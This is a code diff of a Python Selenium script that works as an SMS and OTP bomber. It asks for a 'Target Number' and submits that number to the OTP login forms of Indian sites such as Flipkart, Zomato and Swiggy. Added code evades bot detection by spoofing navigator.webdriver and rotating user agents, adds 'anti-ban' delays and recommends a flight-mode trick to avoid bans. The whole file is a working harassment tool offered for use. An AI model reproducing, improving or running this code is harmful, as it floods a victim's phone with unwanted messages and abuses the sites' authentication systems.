@@ -1,31 +1,14 @@
 import time
 import os
-import sys
+import random
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.common.keys import Keys
 
-# --- CONFIGURATION ---
+# --- CONFIG ---
 SMS_FILE = "sms.txt"
-CALL_FILE = "call.txt"
 success, failed = 0, 0
-
-# --- SMART SELECTORS FOR TOP INDIAN SITES ---
-SITE_SELECTORS = {
-    "flipkart.com": {"input": "//input[contains(@class, '_2IX_2-')]", "btn": "//button[contains(text(), 'OTP')]"},
-    "zomato.com": {"input": "//input[@placeholder='Phone']", "btn": "//*[contains(text(), 'Send OTP')]"},
-    "swiggy.com": {"input": "//input[@id='mobile']", "btn": "//a[contains(text(), 'LOGIN')]"},
-    "pharmeasy.in": {"input": "//input[@id='phone']", "btn": "//button[contains(text(), 'Send OTP')]"},
-    "1mg.com": {"input": "//input[@id='signup-mobile-number']", "btn": "//a[contains(text(), 'CONTINUE')]"},
-    "meesho.com": {"input": "//input[@type='tel']", "btn": "//button[contains(@type, 'submit')]"}
-}
-
-def load_links(filename):
-    if not os.path.exists(filename): return []
-    with open(filename, "r") as f:
-        return [line.strip() for line in f if line.strip() and line.startswith("http")]
 
 def create_driver():
     options = Options()
@@ -33,49 +16,71 @@ def create_driver():
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_argument("user-agent=Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36")
+    # Real Mobile User Agent
+    ua_list = [
+        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36"
+    ]
+    options.add_argument(f"user-agent={random.choice(ua_list)}")
     
     service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
     try:
         driver = webdriver.Chrome(service=service, options=options)
-        # Stealth Script: Anti-bot bypass
-        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        driver.set_page_load_timeout(30)
+        # --- STEALTH: REMOVE BOT FOOTPRINT ---
+        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
+            "source": """
+                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+                window.chrome = { runtime: {} };
+            """
+        })
+        driver.set_page_load_timeout(60) # High timeout for slow 4G
         return driver
     except: return None
 
 def attempt_action(driver, site, mobile):
     try:
-        driver.find_element(By.TAG_NAME, 'body').send_keys(Keys.ESCAPE) # Close Popups
-        time.sleep(2)
+        # Step 1: Wait for any input box (Smart Wait)
+        time.sleep(10) # 4G ke liye zyada wait
         
-        # Check for specific selector
-        selector = next((v for k, v in SITE_SELECTORS.items() if k in site), None)
+        # Swiggy/Zomato special handling
+        if "swiggy" in site or "zomato" in site:
+            driver.execute_script("window.scrollTo(0, 500);")
+            time.sleep(2)
+
+        # Step 2: Input search
+        m_box = None
+        inputs = driver.find_elements(By.TAG_NAME, "input")
+        for i in inputs:
+            attr = str(i.get_attribute("outerHTML")).lower()
+            if any(k in attr for k in ["tel", "mobile", "phone", "number"]):
+                if i.is_displayed():
+                    m_box = i; break
         
-        if selector:
-            m_box = driver.find_element(By.XPATH, selector["input"])
-            m_box.clear()
-            m_box.send_keys(mobile)
-            time.sleep(1)
-            btn = driver.find_element(By.XPATH, selector["btn"])
-            driver.execute_script("arguments[0].click();", btn)
-            return True
-        else:
-            # Universal Smart Detection
+        if not m_box:
+            # Login button click logic
+            buttons = driver.find_elements(By.TAG_NAME, "button")
+            for b in buttons:
+                if any(k in b.text.lower() for k in ["login", "sign", "otp"]):
+                    driver.execute_script("arguments[0].click();", b)
+                    time.sleep(5); break
+            
+            # Re-check for box
             inputs = driver.find_elements(By.TAG_NAME, "input")
             for i in inputs:
-                attr = str(i.get_attribute("outerHTML")).lower()
-                if any(x in attr for x in ["tel", "mobile", "phone"]):
-                    if i.is_displayed():
-                        i.clear()
-                        i.send_keys(mobile)
-                        time.sleep(1)
-                        btns = driver.find_elements(By.TAG_NAME, "button")
-                        for b in btns:
-                            if any(x in b.text.lower() for x in ["otp", "continue", "login", "send"]):
-                                driver.execute_script("arguments[0].click();", b)
-                                return True
-                        break
+                if "tel" in str(i.get_attribute("type")): m_box = i; break
+
+        if m_box:
+            m_box.clear()
+            m_box.send_keys(mobile)
+            time.sleep(2)
+            
+            # Step 3: Click Submit
+            btns = driver.find_elements(By.TAG_NAME, "button")
+            for b in btns:
+                if any(k in b.text.lower() for k in ["otp", "continue", "login", "send"]):
+                    driver.execute_script("arguments[0].click();", b)
+                    time.sleep(5)
+                    return True
     except: pass
     return False
 
@@ -85,7 +90,6 @@ def attempt(site, mobile):
     if not driver: return
     try:
         driver.get(site)
-        time.sleep(7)
         if attempt_action(driver, site, mobile):
             print(f"[+] SUCCESS: {site}")
             success += 1
@@ -93,47 +97,31 @@ def attempt(site, mobile):
             print(f"[-] FAILED: {site}")
             failed += 1
     except:
-        print(f"[!] TIMEOUT: {site}")
+        print(f"[!] TIMEOUT (Slow Net): {site}")
         failed += 1
     finally:
         driver.quit()
 
 def main():
-    try:
-        os.system("clear")
-        print("========================================")
-        print("    🚀 ULTIMATE AUTOMATION v7.0       ")
-        print("========================================\n")
+    os.system("clear")
+    print("========================================")
+    print("    🔥 BULLETPROOF STEALTH BOT v8.0     ")
+    print("========================================\n")
+    
+    target = input("Enter Target Number: ")
+    if not os.path.exists(SMS_FILE):
+        print("sms.txt not found!"); return
         
-        target = input("Enter Target Number: ")
-        sms_links = load_links(SMS_FILE)
-        call_links = load_links(CALL_FILE)
-        
-        print(f"\nLoaded: {len(sms_links)} SMS | {len(call_links)} Call links")
-        print("\nSelect Mode:")
-        print("1. SMS Mode Only")
-        print("2. Call Mode Only")
-        print("3. Mixed Mode (Both)")
-        
-        mode = input("\nChoice: ")
-        
-        targets = []
-        if mode == "1": targets = sms_links
-        elif mode == "2": targets = call_links
-        elif mode == "3": targets = sms_links + call_links
-        else:
-            print("Invalid Choice!"); return
+    with open(SMS_FILE, "r") as f:
+        links = [l.strip() for l in f if l.strip()]
 
-        print(f"\n[*] Starting on {len(targets)} sites. CTRL+C to Stop.\n")
-        
-        for site in targets:
-            attempt(site, target)
-            time.sleep(2)
+    print(f"\n[*] Running on {len(links)} sites. Flight Mode trick recommended.\n")
+    
+    for link in links:
+        attempt(link, target)
+        time.sleep(3) # Anti-ban gap
 
-    except KeyboardInterrupt:
-        print("\n\n[!] Stopped by User.")
-    finally:
-        print(f"\n--- DONE | SUCCESS: {success} | FAILED: {failed} ---")
+    print(f"\n--- DONE | SUCCESS: {success} | FAILED: {failed} ---")
 
 if __name__ == "__main__":
     main()
